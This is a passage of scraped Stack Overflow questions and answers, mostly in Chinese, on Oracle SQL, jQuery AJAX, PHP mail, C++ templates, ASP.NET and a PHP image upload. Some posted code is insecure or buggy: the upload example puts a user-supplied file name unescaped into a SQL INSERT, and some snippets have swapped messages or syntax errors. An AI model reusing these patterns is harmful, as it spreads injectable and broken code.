          NUMTODSINTERVAL(REQUIRED_TIME, 'MINUTE') AS ELAPSED 
     FROM YOUR_TABLE_HERE) 
SELECT TRIM(CASE
              WHEN EXTRACT(HOUR FROM ELAPSED) < 0 THEN '-'
              WHEN EXTRACT(MINUTE FROM ELAPSED) < 0 THEN '-'
              ELSE ' '
            END ||
            TRIM(TO_CHAR(ABS(EXTRACT(HOUR FROM ELAPSED)), '09')) || '.' || 
            TRIM(TO_CHAR(ABS(EXTRACT(MINUTE FROM ELAPSED)), '09')))
  FROM e; 
```

`NUMTODSINTERVAL`是 Oracle 的函数，用于将诸如 REQUIRED_TIME 之类的标量值转换为 INTERVAL，然后可以将其用于涉及 DATE 等的计算。文档[在这里](http://docs.oracle.com/cd/E11882_01/server.112/e17118/functions117.htm)。

希望这会让事情变得更简单一些。

分享和享受。

* * *

编辑：更正了 EXTRACT 调用。添加了 SYSDATE - LOADING_TIME 的结果到时间间隔的转换。包括标志处理。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-11T22:22:35.970

要进行`EXTRACT`工作，您必须使用转换字段以`TO_TIMESTAMP()`显示正确的时间戳。另外，我认为您所说的`MI`不是`MM`因为`MM`意味着月份而不是分钟。像这样的东西-

```
SELECT EXTRACT(MINUTE FROM TO_TIMESTAMP('01-JAN-2005 19:15:26','DD-MON-YYYY HH24:MI:SS')) FROM dual; 
```

使用日期字段，它将是-

```
SELECT EXTRACT(MINUTE FROM TO_TIMESTAMP(TO_CHAR(sysdate,'DD-MON-YYYY HH24:MI:SS'),'DD-MON-YYYY HH24:MI:SS')) FROM dual; 
```

在您的查询中，`hour from (sysdate...)`and`minute from (sysdate...)`可能正在返回`0`. 但是，因为`day`它会起作用。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-11T22:38:32.593

您想要以小时和分钟表示的差异。我会用简单的算术来做到这一点：

```
select trunc((sysdate - c.LoadingTime)*24) as hours,
       trunc(mod((sysdate - c.LoadingTime)*24*60, 60)) as minutes
from . . . 
```

您可以将其格式化为字符串：

```
select to_char(trunc((sysdate - c.LoadingTime)*24), '00')||':'+
       to_char(trunc(mod((sysdate - c.LoadingTime)*24*60, 60)), '00') 
```

# php - 我可以使用 AJAX 在 jQuery 脚本中将表单数据/变量传递给 php 吗？

> ID：11917345
> 
> 赞同：2
> 
> 时间：2012-08-11T20:20:22.037
> 
> 标签：php, jquery, ajax, forms, form-data

我有一个将数据传递给同一页面上的 jQuery 脚本的表单。表格如下所示：

```
<form method="post" action="<?php echo $_SERVER['PHP_SELF'];?>">
<input type="radio" name="favourites" value="all" checked="checked"> all tracks &nbsp&nbsp<input type="radio" name ="favourites" value="favourites"> favourites only<br><br>
<input type="submit" name="submit" id="filter" class="submit" value="filter"><br>
</form> 
```

收藏夹的值随后由 PHP 在同一页面头部的 jQuery 脚本中检索，该脚本动态生成 MySQL 查询。但发生这种情况是因为页面被重新加载。如果可能的话，我想使用 AJAX 将表单数据/变量传递给 jQuery 脚本而不重新加载页面。我知道我可以使用 AJAX 操作 html 和 css，但我也可以在头部操作 jQuery 脚本吗？如果是这样，我将如何处理？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-11T20:35:16.537

为简单起见，给表单一个唯一的 ID，然后简单地将 jquery 发布到为此目的而设计的 AJAX 文件。

例子：

**HTML**

```
<form id="postForm" method="POST">
    <input type="radio" name="filter" value="1" /> Only favorites
    <input type="radio" name="filter" value="2" /> Everything
    <input type="submit" name="postFormSubmit" />
</form> 
```

**jQuery**

```
$('form#postForm').submit(function(e){
    e.preventDefault(); //Prevents a page reload
    var filter = $(this).find("input[@name=filter]:checked").val(); //Gets the value of "filter"
    $.post("/path/to/ajax.php",{filterType:filter},function(){
        // Callback, could make the data output attach to this.
    });
}); 
```

这就是我至少要开始的地方:)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-11T20:51:56.913

看看[这个](http://api.jquery.com/serialize/)。代码会像这样。

HTML：

```
<form id="postForm" method="POST">
    <input type="radio" name="filter" value="1" /> Only favorites
    <input type="radio" name="filter" value="2" /> Everything
    <input type="submit" name="postFormSubmit" />
</form> 
```

Javascript：

```
jQuery("#postForm").submit(function(event){
    event.preventDefault();
    jQuery.post("/ajax.php", jQuery("#postForm").serialize(), function(){
    //done
    });
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-11T22:26:37.747

如果你不想自己写，你可能会对这个插件感兴趣[http://jquery.malsup.com/form/](http://jquery.malsup.com/form/)

# actionscript-3 - ActionScript 3 与“is”保留关键字相反

> ID：11917349
> 
> 赞同：1
> 
> 时间：2012-08-11T20:20:51.990
> 
> 标签：actionscript-3, flash, actionscript, casting, reserved-words

只是为了满足我的好奇心，`is`ActionScript 3 中的 reserved 关键字的反义词是什么，如下例所示：

```
if (myObject is ArrayCollection) {
  //Do stuff...
} else {
  //Do something else...
} 
```

这样我就可以做这样的事情：

```
if (myObject isnotoperator ArrayCollection) {
  //Do something else...
} else {
  //Do stuff...
} 
```

感谢您的时间。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-11T20:29:31.087

我不相信有一个。相反，我在语句前面加上布尔 not 运算符，如下所示：

```
if (!(myObject is ArrayCollection)) {
  //Do stuff...
} else {
  //Do something else...
} 
```

# python - 点安装位数组

> ID：11917350
> 
> 赞同：6
> 
> 时间：2012-08-11T20:20:53.000
> 
> 标签：python, pip

运行`pip install bitarray`对我来说会导致致命错误：

```
bitarray/_bitarray.c:9:20: fatal error: Python.h: No such file or directory 
```

我正在运行**Ubuntu 12.04 升级**。也许我错过了安装一些依赖项？

运行 Python 工作：

```
Python 2.7.3 (default, Aug  1 2012, 05:16:07) 
[GCC 4.6.3] on linux2 
```

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-08-11T20:24:34.597

至少，您将需要 python-dev 包

```
sudo apt-get install python-dev

```

# c++ - 好友功能默认模板：英特尔 ICPC 警告

> ID：11917351
> 
> 赞同：4
> 
> 时间：2012-08-11T20:20:55.983
> 
> 标签：c++, templates, c++11, friend, icc

我有以下测试代码：

```
// friendfunction.h                                                                                   
#include <iostream>

template<typename T, unsigned int... TDIM> class MyClass
{
  template<typename T1, typename T0, unsigned int... TDIM0, class> friend inline const MyClass<T0, TDIM0...> myFunction(const T1& x, const MyClass<T0, TDIM0...>& y);
};

template<typename T0, typename T, unsigned int... TDIM, class = typename std::enable_if<std::is_fundamental<T0>::value>::type> inline const MyClass<T, TDIM...> myFunction(const T0& x, const MyClass<T, TDIM...>& y)
{
  std::cout<<"It works !"<<std::endl;
  return MyClass<T, TDIM...>(y);
}

// friendfunction.cpp
#include "friendfunction.h"
int main(int argc, char *argv[])
{
  MyClass<double, 3, 3> myClass;
  myFunction(10, myClass);
  return 0;
} 
```

使用 g++ (4.6.1) 我编译：

```
g++ -Wall -Wextra -Winline -Wno-unused -O3 -std=c++0x friendfunction.cpp -o friendfunction 
```

并使用英特尔 ICPC (12.1.0 20111011)：

```
icpc -Wall -Wno-unused -O3 -std=c++0x friendfunction.cpp -o friendfunction 
```

使用 g++ 我没有错误也没有警告，但是使用 Intel C++ 我有以下警告：

```
friendfunction.h(5): warning #2922: template parameter "<unnamed>" cannot be used because it follows a parameter pack and cannot be deduced from the parameters of function template "myFunction"
template<typename T1, typename T0, unsigned int... TDIM0, class> friend inline const MyClass<T0, TDIM0...> myFunction(const T1& x, const MyClass<T0, TDIM0...>& y); 
```

有人有办法避免这种情况吗？

此外，您是否发现友元函数的语法完全正常/安全，或者您认为它会在某些奇怪的情况下产生错误？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-12T13:15:05.660

只是猜测，但似乎 icpc 希望参数包成为最后一个模板参数。如果包中的可变参数不能与包后面的另一个参数区分开来，那么这是有道理的，恕我直言。但在你的情况下，可变参数是整数，下一个是类类型，所以看起来 icpc 弄错了......

# javascript - jstree 添加新节点而不提供文本输入？

> ID：11917353
> 
> 赞同：4
> 
> 时间：2012-08-11T20:21:24.283
> 
> 标签：javascript, jstree

我有一个新的 jstree 节点的表单，因为我需要存储更多的数据而不仅仅是节点的名称。所以我有一个标题字段，用于节点名称/标题。唯一的问题是，当我运行命令添加新节点时，它会这样做，但会提供并输入您应该输入的 jstree 节点名称/标题。

它有我从那里的表单传递给它的文本，我只是不希望它显示输入并让用户按回车键。

我尝试在返回的节点上运行 enter keypress 事件，但没有成功。这是有问题的代码。

```
 var new_node = js_tree.jstree('create', null, 'last', {'data': link_text});
        var e = jQuery.Event("keydown");
        e.which = 13; // # Some key code value
        e.keyCode = 13
        new_node.trigger(e); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-12T12:10:16.840

好的，我在搜索时错过了这个，但这是另一篇文章的答案：[在 jstree 中创建一个新节点](https://stackoverflow.com/questions/9821006/creating-a-new-node-in-jstree?rq=1)

# html - 如何在您的 HTML 应用程序中使用 Unicode 字符 - 内联和数据绑定？

> ID：11917354
> 
> 赞同：1
> 
> 时间：2012-08-11T20:21:46.993
> 
> 标签：html, data-binding, unicode

哪些转义字符可用于在 HTML 应用程序中插入 Unicode 字符。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T12:54:19.270

在 HTML 中插入 Unicode 字符时，将 HEX 值以开头`&#x`和结尾换行`;`

当像敲除这样的数据绑定开始 HEX 值时`\u`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-11T20:23:58.913

如果您的文档是 UTF-8 文档并且您正在发送相应的`content-type`标题和/或元元素，您可以简单地使用字符而不转义。

所有现代浏览器都理解这种 Unicode 编码，并将正确显示它们（假设客户端上的操作系统安装了正确的字体）。

# c# - 我有两个字符串列表，如何从每个列表索引与另一个创建一个字符串？

> ID：11917360
> 
> 赞同：1
> 
> 时间：2012-08-11T20:22:45.527
> 
> 标签：c#

例如我有一个列表：

```
[0] daniel
[1] moses 
```

现在是第二个列表：

```
[0] hello world
[1] hi everyone 
```

我想建立一个新的字符串列表，它将是：

```
[0] daniel hellow world
[1] moses hi everyone 
```

我该怎么做？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-11T20:26:37.360

您可以使用 Linq / [**Enumerable.Zip**](http://msdn.microsoft.com/en-us/library/dd267698.aspx)：

```
var list1 = new List<string>() {"daniel", "moses"};
var list2 = new List<string>() { "hello world", "hi everyone" };

var resultList = list1.Zip(list2, (a, b) => a + " " + b)
                      .ToList(); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-11T20:26:45.450

您可以使用 LINQ[`Zip`](http://msdn.microsoft.com/en-us/library/dd267698.aspx)方法：

```
var result = first.Zip(second, (f, s) => string.Format("{0} {1}", f, s)); 
```

# dojo - Xpages Dojo dijit.form.numbertextbox

> ID：11917361
> 
> 赞同：1
> 
> 时间：2012-08-11T20:22:48.100
> 
> 标签：dojo, xpages, dijit.form, xpages-extlib

我在 xpage 上创建了一个数字字段。但是输入检查不能正常工作。它只接受数字，这是预期的行为，但输入的数字的数量没有经过验证。由于 regExp \d{6}，无法接受超过 6 位的数字。

这是xpage上的代码：

`<xe:djNumberTextBox id="inputTextMidasId" dojoType="dijit.form.NumberTextBox" value="#{complaintDocument.midasId}" javaType="short" regExp="\d{6}"> <xe:this.constraints> <xe:djNumberConstraints pattern="######"> </xe:djNumberConstraints> </xe:this.constraints> </xe:djNumberTextBox>`

谁能告诉如何使这段代码工作？谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-11T21:07:10.273

我无法解释为什么正则表达式不能按预期工作。

根据 XPages Extension Library 书，您可以使用`min`和的`max`属性`xe:djNumberConstraints`来控制允许的最小值和最大值。所以也许你应该使用那些而不是正则表达式？

以下正是您想要的：

```
<xe:djNumberTextBox id="djNumberTextBox1" value="#{viewScope.test}">
    <xe:this.constraints>
        <xe:djNumberConstraints min="1" max="999999"></xe:djNumberConstraints>
    </xe:this.constraints>
</xe:djNumberTextBox> 
```

**更新：**

如果您在 a 中写入 001，`xe:djNumberTextBox`它将在用户离开该字段时转换为 1。这是你想要的吗？

您可以使用`xe:djValidationTextBox`正则表达式验证输入。以下将执行您所需的验证，并允许在字段中保留诸如 001 之类的输入：

```
<xe:djValidationTextBox id="djValidationTextBox1" regExp="\d{6}"></xe:djValidationTextBox> 
```

# iphone - 在 Web 视图中滚动 html 时泄漏

> ID：11917362
> 
> 赞同：1
> 
> 时间：2012-08-11T20:23:01.243
> 
> 标签：iphone, objective-c, xcode, ipad

我看到内存泄漏，我不确定它的来源：我有一个简单的 UIView，其中包含简单的 UIWebview 和一个相应地显示它的方法

```
[self setHelp]; 

NSString *HTMLData = @"<body style='background-color:black;'> <p style='color:white;'> <u style='color:teal;'>  Using xMode</u> <br />There are a number of ways you can customize the program to suit your needs. In its most simplistic way xMode can be used in its easy mode. In this mode (default mode ) you need to enter a gross amount for each applicable category right at the textbox of the button. ...blah blah..................</p>   <br /> <br /> </body>";

[WV loadHTMLString:HTMLData baseURL:nil]; 
```

我有几个 html 屏幕，一切正常。但是，当我使用 Instrument 进行测试时，它仅在我滚动帮助屏幕时才显示泄漏，如果我只是关闭/打开而不滚动，则不会显示泄漏。

任何想法可能导致这种情况，是来自我的代码还是来自某些框架或库？

![在此处输入图像描述](../Images/d870bbb261013019f776838d24efda4a.png)

# php - Adapt php send mail script to send msg to multiple addresses

> ID：11917364
> 
> 赞同：1
> 
> 时间：2012-08-11T20:23:16.497
> 
> 标签：php, javascript, jquery, html

I'd like to adapt the code below so that the e-mail are sent to 2 addresses instead of one. I tried this "sendto = "myaddress1@gmail.com, myaddress2@gmail.com"" without success (msg don't get sent). Any idea? My hosting company is 1&1 (just subscribed so assuming running a recent version of php)

Here is the orginal code:

```
<?php
$sendto   = "myaddress@gmail.com";
$usermail = $_POST['email'];
$username = $_POST['name'];
$content  = nl2br($_POST['msg']);

$subject  = "New Message from domain.com";
$headers  = "From: " . strip_tags($usermail) . "\r\n";
$headers .= "Reply-To: ". strip_tags($usermail) . "\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/html;charset=utf-8 \r\n";

$msg  = "<html><body style='font-family:Arial,sans-serif;'>";
$msg .= "<h2 style='font-weight:bold;border-bottom:1px dotted #ccc;'>New message</h2>\r\n";
$msg .= "<p><strong>From:</strong> ".$username."</p>\r\n";
$msg .= "<p><strong>E-mail:</strong> ".$usermail."</p>\r\n";
$msg .= "<p><strong>Message:</strong> ".$content."</p>\r\n";
$msg .= "</body></html>";

if(@mail($sendto, $subject, $msg, $headers)) {
    echo "true";
} else {
    echo "false";
}

?> 
```

**And the javascript:**

```
// Contact form
function validateEmail(email) { 
        var reg = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
        return reg.test(email);
    }

    $(document).ready(function() {
        $(".modalbox").fancybox();
        $("#contact").submit(function() { return false; });

        $("#send").on("click", function(){
            var emailval  = $("#email").val();
            var msgval    = $("#msg").val();
            var msglen    = msgval.length;
            var mailvalid = validateEmail(emailval);
            var nameval = $("#name").val();

            if(mailvalid == false) {
                $("#email").addClass("error");
            }
            else if(mailvalid == true){
                $("#email").removeClass("error");
            }

            if(msglen < 4) {
                $("#msg").addClass("error");
            }
            else if(msglen >= 4){
                $("#msg").removeClass("error");
            }

            if(nameval < 2) {
            //name must be at least 2 characters
                    $("#name").addClass("error");
            }
            else if(nameval >= 2){
                    $("#name").removeClass("error");
            }

            if(mailvalid == true && msglen >= 4) {
                // if both validate we attempt to send the e-mail
                // first we hide the submit btn so the user doesnt click twice
                $("#send").replaceWith("<em>sending...</em>");

                $.ajax({
                    type: 'POST',
                    url: '../sendmessage.php',
                    data: $("#contact").serialize(),
                    success: function(data) {
                        if(data == "true") {
                            $("#contact").fadeOut("fast", function(){
                                $(this).before("<p><strong>Success! Your message has been sent, thank you.</strong></p>");
                                setTimeout("$.fancybox.close()", 1000);
                            });
                        }
                    }
                });
            }
        });
    }); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-11T20:28:25.463

Commas should work according to the documentation [http://php.net/manual/en/function.mail.php], so something else must be wrong. Try removing the @ and see if you get an error message. What version of PHP are you using?

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-11T20:24:42.377

Create [array](http://php.net/manual/en/function.mail.php) with addresses and use [foreach loop](http://php.net/manual/en/control-structures.foreach.php) to send the mail to each one.

Addition: Create array with addresses and do loop:

```
$addresses = array(user1@example.com,user2@example.com,user3@example.com);
foreach($addresses as $address) {
if(@mail($address, $subject, $msg, $headers)) {
    echo "true";
} else {
    echo "false";
}
} 
```

Or shorter:

```
$addresses = array(user1@example.com,user2@example.com,user3@example.com);
foreach($addresses as $address) {
    echo (@mail($address, $subject, $msg, $headers)) ? 'true' : 'false';
} 
```

# mercurial - Mercurial EncodeDecodeFilter 临时文件模板没有从 sed 批处理中提取我的 OUTFILE

> ID：11917365
> 
> 赞同：1
> 
> 时间：2012-08-11T20:23:53.237
> 
> 标签：mercurial, sed, mercurial-hook

我目前被无情地摒弃了简单且看似必要的前提，即如果您遵循文档，事情就会像广告宣传的那样工作。虽然我确实知道情况并非总是如此，但最近我一直受到此类 WTF 洪流的困扰。

让狙击手高兴的第一件事是，是的，这与 hg 关键字有关。具体来说，确保它们在提交之前总是被缩小。我发现 precommit 钩子`hg kwshrink`不起作用，因为 hg 锁定了目录，所以下一个候选者是`[encode]`过滤器。

```
[encode]
#1 **.cs = sed -e "s/\$Date.*\$/\$Date\$/g"
#2 **.cs = tempfile: C:\batch\hg-kwshrink.bat INFILE OUTFILE 
```

我从 #2 开始，但 #1 也不起作用，我的批次很简单

```
sed -e "s/\$Date.*\$/\$Date\$/g" %1 > %2
rem sed -e "s/\$Date.*\$/\$Date\$/g" %1 > %1.tmp
rem echo %1 >>C:\temp\sed1.txt
rem echo %2 >>C:\temp\sed2.txt
rem copy %1.tmp C:\temp\sed3.txt
rem copy %1.tmp %2 /y 
```

rems 显示我的调查。

看起来一切正常，除了 hg 没有使用我的输出，它只是提交原始文件，就好像它从未阅读过关于它应该如何表现的文档一样。

显然我错过了一个魔法咒语，或者需要重新评估我在这里的职业选择。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-11-03T09:06:45.807

尝试

```
sed -e "s/\\$Date.*\\$/\\$Date\\$/g" 
```

或者

```
sed -e 's/\$Date.*\$/\$Date\$/g' 
```

\ 被替换为双引号之间

# asp.net - 将内联 css 移动到样式表后，在设计视图中工作，但在运行时不工作

> ID：11917367
> 
> 赞同：1
> 
> 时间：2012-08-11T20:24:04.953
> 
> 标签：asp.net, css, master-pages, stylesheet

我正在尝试将一些 css 从我的母版页移到样式表中。基本上，我做了什么：

*   将内联 css 复制/粘贴到新样式表中
*   从母版页引用样式表

完成此操作后，设计视图继续按预期显示（当我从母版页中取出 css 时，我看到我的样式消失了，但是在我添加对我放入的新样式表的引用后，它们又返回了，正如预期的那样）。但是，当我运行该项目并在 Firefox 中打开它时，它就像样式消失了一样。对我来说这似乎很奇怪，它可以在设计视图中工作，但不能在 Web 浏览器中工作。

我认为这只是因为我不知道 b/c 的一些非常简单的事情，我是制作网站的新手。

这是母版页的当前代码：

```
<%@ Master Language="C#" AutoEventWireup="true" CodeFile="Site.master.cs" Inherits="SiteMaster" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
<head runat="server">
    <title></title>
    <link href="~/Styles/Site.css" rel="stylesheet" type="text/css" runat="server" />
    <link href="~/Styles/SiteMaster.css" rel="stylesheet" type="text/css" runat="server" />
    <link href="~/Styles/Menu.css" rel="stylesheet" type="text/css" runat="server" />

    <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
    <script type="text/javascript" src="~/scripts/ddaccordion.js"></script>
    <script type="text/javascript" src="~/scripts/menuInit.js"></script>

    <asp:ContentPlaceHolder ID="HeadContent" runat="server">
    </asp:ContentPlaceHolder>
</head>
<body>
    <form id="form1" runat="server">
    <table class="mainTable">
        <tr>
            <td class="headerCell" colspan="2" />
        </tr>
        <tr>
            <td class="menuCell">
                <div class="urbangreymenu">
                    <h3 class="headerbar"><a href="Default.aspx">Home</a></h3>
                    <%--<ul class="submenu">
                    <li><a href="http://www.dynamicdrive.com/style/csslibrary/category/C1/">Horizontal CSS Menus</a></li>
                    <li><a href="http://www.dynamicdrive.com/style/csslibrary/category/C2/">Vertical CSS Menus</a></li>
                    </ul>--%>

                    <h3 class="headerbar"><a href="PostItem.aspx">Post Items</a></h3>
                   <%-- <ul class="submenu">
                    <li><a href="http://www.javascriptkit.com/cutpastejava.shtml" >Free JavaScripts</a></li>
                    <li><a href="http://www.javascriptkit.com/javatutors/">JavaScript tutorials</a></li>
                    </ul>--%>
                </div>
            </td>
            <td class="contentCell">
                <asp:ContentPlaceHolder ID="MainContent" runat="server" />
            </td>
        </tr>
        <tr>
            <td class="footerCell" colspan="2" />
        </tr>
    </table>
    </form>
</body>
</html> 
```

这是 SiteMaster.css 的代码：

```
.mainTable
{
    width: 100%;
}
.menuCell
{
    width: 218px;
    height: 157px;
}
.headerCell
{
    height: 63px;
}
.footerCell
{
    height: 77px;
}
.contentCell
{
    height: 157px;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-11T20:42:18.813

设计时间会误导你。如果您的网站结构是这样的：

```
content
   site.css
master
   site.master
pages
   store
      mypage.aspx
   admin
      tools
         adminpage.aspx 
```

母版页中的 css 链接可能如下所示：`../content/site.css`并且此链接看起来是正确的，并且 VS 设计器在设计时找到 css 没有问题。但是，在运行时，母版页不会单独运行，而是与内容页一起运行，并且指向 css 页面的链接按原样发送到客户端。您可能认为这`../../content/site.css`可以工作，但这仅适用于`mypage.aspx`但不适用于`adminpage.aspx`.

解决方案是让服务器帮助您：

```
<link rel="stylesheet" type="text/css" href="~/content/site.css" runat="server" /> 
```

这样，无论页面文件夹是什么，您总能获得正确的链接。

要克服 css 浏览器缓存，请在链接中添加一个版本`File.css?version=1`并在任何更改时增加它，或使用哈希版本控制，如此处[http://www.codeproject.com/Articles/203288/Automatic-JS-CSS-versioning-to -更新浏览器缓存](http://www.codeproject.com/Articles/203288/Automatic-JS-CSS-versioning-to-update-browser-cach)

# php - 上传和调整你的图片链接到 mysql

> ID：11917368
> 
> 赞同：2
> 
> 时间：2012-08-11T20:24:05.687
> 
> 标签：php, sql, file, upload, image-uploading

我从网上得到了这个脚本，并改变了一些东西以满足我的需要，但无论我做什么，我都无法将链接放入我的数据库。

```
<html>
    <body>
    <h2>Upload and Resize Your Image</h2>
    <?php
    // index.php
    function generate_resized_image(){
        $max_dimension = 800; // Max new width or height, can not exceed this value.
        $dir = "../../upload123/"; // Directory to save resized image. (Include a trailing slash - /)
        // Collect the post variables.
        $postvars = array(
            "image"    => trim($_FILES["image"]["name"]),
            "image_tmp"    => $_FILES["image"]["tmp_name"],
            "image_size"    => (int)$_FILES["image"]["size"],
            "image_max_width"    => (int)$_POST["image_max_width"],
            "image_max_height"   => (int)$_POST["image_max_height"]
        );
        // Array of valid extensions.
        $valid_exts = array("jpg","jpeg","gif","png");
        // Select the extension from the file.
        $ext = end(explode(".",strtolower(trim($_FILES["image"]["name"]))));
        // Check not larger than 175kb.
        if($postvars["image_size"] <= 1048576){
            // Check is valid extension.
            if(in_array($ext,$valid_exts)){
                if($ext == "jpg" || $ext == "jpeg"){
                    $image = imagecreatefromjpeg($postvars["image_tmp"]);
                }
                else if($ext == "gif"){
                    $image = imagecreatefromgif($postvars["image_tmp"]);
                }
                else if($ext == "png"){
                    $image = imagecreatefrompng($postvars["image_tmp"]);
                }
                // Grab the width and height of the image.
                list($width,$height) = getimagesize($postvars["image_tmp"]);
                // If the max width input is greater than max height we base the new image off of that, otherwise we
                // use the max height input.
                // We get the other dimension by multiplying the quotient of the new width or height divided by
                // the old width or height.
                if($postvars["image_max_width"] > $postvars["image_max_height"]){
                    if($postvars["image_max_width"] > $max_dimension){
                        $newwidth = $max_dimension;
                    } else {
                        $newwidth = $postvars["image_max_width"];
                    }
                    $newheight = ($newwidth / $width) * $height;
                } else {
                    if($postvars["image_max_height"] > $max_dimension){
                        $newheight = $max_dimension;
                    } else {
                        $newheight = $postvars["image_max_height"];
                    }
                    $newwidth = ($newheight / $height) * $width;
                }
                // Create temporary image file.
                $tmp = imagecreatetruecolor($newwidth,$newheight);
                // Copy the image to one with the new width and height.
                 imagecopyresampled($tmp,$image,0,0,0,0,$newwidth,$newheight,$width,$height);
                // Create random 4 digit number for filename.
                $rand = rand(1000,9999);
                $filename = $dir.$rand.$postvars["image"];
                // Create image file with 100% quality.
                imagejpeg($tmp,$filename,100);
                return "<strong>Image Preview:</strong><br/>
                    <img src=\"".$filename."\" border=\"0\" title=\"Resized  Image Preview\" style=\"padding: 4px 0px 4px 0px;background-color:#e0e0e0\" /><br/>
                    Resized image successfully generated. <a href=\"".$filename."\" target=\"_blank\"  name=\"Download your resized image now!\">Click here to download your image.</a>";
                imagedestroy($image);
                imagedestroy($tmp);
            } else {
                return "File size too large. Max allowed file size is 175kb.";
            }
        } else {
            return "Invalid file type. You must upload an image file. (jpg, jpeg, gif, png).";
        }
    }
    if(isset($_GET["do"])){
        if($_GET["do"] == "upload"){
           $upload_and_resize = generate_resized_image();
        } else {
        $upload_and_resize = "";
    }
    } else {
        $upload_and_resize = "";
    }
    ?>

                <form action="./upload.php?do=upload" method="post" enctype="multipart/form-data">
                    <table width="100%" align="center" border="0" cellpadding="2" cellspacing="0">
                    <tr>
                        <td align="left" width="100">Max Width:</td>
                        <input name="image_max_width" type="hidden" id="hiddenField" value="400" />
                    </tr>
                    <tr>
                        <td align="left">Image:</td>
                        <td align="left"><input type="file" name="image" size="40" /></td>
                    </tr>
                    <tr>
                        <td align="left" colspan="2">
                            <ol style="margin:0;padding:3px 0px 3px 15px">
                                <li>Max file size: 175 KB.</li>
                                <li>Allowed extensions: jpg, jpeg, gif, png.</li>
                                <li>Max Dimension: <em>800</em>px.</li>
                            </ol>
                    </tr>
                    <tr>
                        <td align="left" colspan="2">
                            <input type="submit" name="submit" value="Submit!" class="submit" />
                        </td>
                    </tr>
                </table>
            </form>

            <div id="upload">
                <?php echo $upload_and_resize; ?>
            </div>
        </body>
    </html> 
```

所以我尝试了各种位置，但没有任何帮助这是我需要放入我的 Db 的内容，即简单的表 1-ID 2-粘液（粘液是图像链接所在的位置）

```
 $filenamex=$filename;
    $con = mysql_connect("localhost","USER","PASS");
    if (!$con)
    {
    die('Could not connect: ' . mysql_error());
    }

    mysql_select_db("myDB", $con);

    $sql="INSERT INTO acc1 (slime)
    VALUES
    ('$filenamex')";

    if (!mysql_query($sql,$con))
      {
      die('Error: ' . mysql_error());
      }

    mysql_close($con) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-12T11:56:11.623

您需要更改 generate_resized_image 函数以仅返回文件路径：

```
<?php
    // index.php
    function generate_resized_image(){
        $max_dimension = 800; // Max new width or height, can not exceed this value.
        $dir = "../../upload123/"; // Directory to save resized image. (Include a trailing slash - /)
        // Collect the post variables.
        $postvars = array(
            "image"    => trim($_FILES["image"]["name"]),
            "image_tmp"    => $_FILES["image"]["tmp_name"],
            "image_size"    => (int)$_FILES["image"]["size"],
            "image_max_width"    => (int)$_POST["image_max_width"],
            "image_max_height"   => (int)$_POST["image_max_height"]
        );
        // Array of valid extensions.
        $valid_exts = array("jpg","jpeg","gif","png");
        // Select the extension from the file.
        $ext = end(explode(".",strtolower(trim($_FILES["image"]["name"]))));
        // Check not larger than 175kb.
        if($postvars["image_size"] <= 1048576){
            // Check is valid extension.
            if(in_array($ext,$valid_exts)){
                if($ext == "jpg" || $ext == "jpeg"){
                    $image = imagecreatefromjpeg($postvars["image_tmp"]);
                }
                else if($ext == "gif"){
                    $image = imagecreatefromgif($postvars["image_tmp"]);
                }
                else if($ext == "png"){
                    $image = imagecreatefrompng($postvars["image_tmp"]);
                }
                // Grab the width and height of the image.
                list($width,$height) = getimagesize($postvars["image_tmp"]);
                // If the max width input is greater than max height we base the new image off of that, otherwise we
                // use the max height input.
                // We get the other dimension by multiplying the quotient of the new width or height divided by
                // the old width or height.
                if($postvars["image_max_width"] > $postvars["image_max_height"]){
                    if($postvars["image_max_width"] > $max_dimension){
                        $newwidth = $max_dimension;
                    } else {
                        $newwidth = $postvars["image_max_width"];
                    }
                    $newheight = ($newwidth / $width) * $height;
                } else {
                    if($postvars["image_max_height"] > $max_dimension){
                        $newheight = $max_dimension;
                    } else {
                        $newheight = $postvars["image_max_height"];
                    }
                    $newwidth = ($newheight / $height) * $width;
                }
                // Create temporary image file.
                $tmp = imagecreatetruecolor($newwidth,$newheight);
                // Copy the image to one with the new width and height.
                 imagecopyresampled($tmp,$image,0,0,0,0,$newwidth,$newheight,$width,$height);
                // Create random 4 digit number for filename.
                $rand = rand(1000,9999);
                $filename = $dir.$rand.$postvars["image"];
                // Create image file with 100% quality.
                imagejpeg($tmp,$filename,100);
   //------------------------------------------------------------------------
   //here is the change
                return $filename; //return the new image path
   //------------------------------------------------------------------------
                imagedestroy($image);
                imagedestroy($tmp);
            } else {
                return "File size too large. Max allowed file size is 175kb.";
            }
        } else {
            return "Invalid file type. You must upload an image file. (jpg, jpeg, gif, png).";
        }
    }
    ?> 
```

然后将您的 sql 代码放入类似以下的函数中：

```
